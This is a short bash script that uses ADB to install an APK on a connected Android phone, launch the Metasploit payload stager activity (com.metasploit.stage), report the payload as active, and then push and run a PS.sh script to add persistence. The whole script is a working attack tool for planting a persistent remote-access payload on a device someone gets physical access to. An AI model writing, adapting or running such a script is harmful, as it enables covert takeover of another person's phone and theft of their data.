#!/bin/bash

echo [*]Waiting for device connection
echo

adb -d wait-for-device
BEGIN=$(date +%s)
adb -d wait-for-device install OP_ADB.apk
adb -d shell am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
NOW=$(date +%s)
   let DIFF=$(($NOW - $BEGIN))
   let SECS=$(($DIFF % 60))
echo
echo [*] Payload activated
echo [*] $SECS seconds
echo [*] Adding persistance...
echo 
adb -d push PS.sh /sdcard/download
adb -d shell sh /sdcard/download/PS.sh

